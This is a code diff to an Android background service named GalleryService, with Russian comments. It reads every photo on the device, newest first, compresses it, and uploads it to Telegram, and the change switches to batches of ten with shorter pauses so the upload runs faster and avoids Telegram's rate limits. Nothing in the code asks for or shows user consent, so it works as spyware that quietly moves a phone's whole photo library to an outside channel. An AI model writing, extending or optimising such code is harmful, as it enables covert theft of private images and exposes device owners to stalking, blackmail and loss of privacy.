@@ -22,27 +22,37 @@ public class GalleryService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         new Thread(() -> {
             List<Uri> allImages = getAllImages();
-            int count = 0;
+            List<byte[]> batch = new ArrayList<>();
+            int totalSent = 0;
+
             for (Uri uri : allImages) {
                 try {
                     InputStream is = getContentResolver().openInputStream(uri);
-                    Bitmap bitmap = BitmapFactory.decodeStream(is);
+                    BitmapFactory.Options options = new BitmapFactory.Options();
+                    options.inSampleSize = 2; // Уменьшаем размер для скорости
+                    Bitmap bitmap = BitmapFactory.decodeStream(is, null, options);
                     if (is != null) is.close();
 
                     if (bitmap != null) {
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
-                        byte[] imageBytes = baos.toByteArray();
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 45, baos); // Сжимаем сильнее
+                        batch.add(baos.toByteArray());
                         bitmap.recycle();
 
-                        new TelegramSender().send(imageBytes, "gallery_" + count + ".jpg");
-                        
-                        // Пауза 1.2 сек, чтобы Telegram не забанил (и быстрее шло)
-                        Thread.sleep(1200); 
-                        count++;
+                        if (batch.size() == 10) { // Отправляем по 10 штук
+                            new TelegramSender().sendMediaGroup(batch, totalSent);
+                            totalSent += 10;
+                            batch.clear();
+                            Thread.sleep(500); // Короткая пауза
+                        }
                     }
                 } catch (Exception e) { e.printStackTrace(); }
             }
+
+            if (!batch.isEmpty()) {
+                new TelegramSender().sendMediaGroup(batch, totalSent);
+            }
+
             stopSelf();
         }).start();
         return START_NOT_STICKY;
@@ -51,8 +61,6 @@ public class GalleryService extends Service {
     private List<Uri> getAllImages() {
         List<Uri> imageUris = new ArrayList<>();
         String[] projection = new String[]{MediaStore.Images.Media._ID};
-        
-        // Сортируем от новых к старым (DESC)
         String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
 
         Cursor cursor = getContentResolver().query(
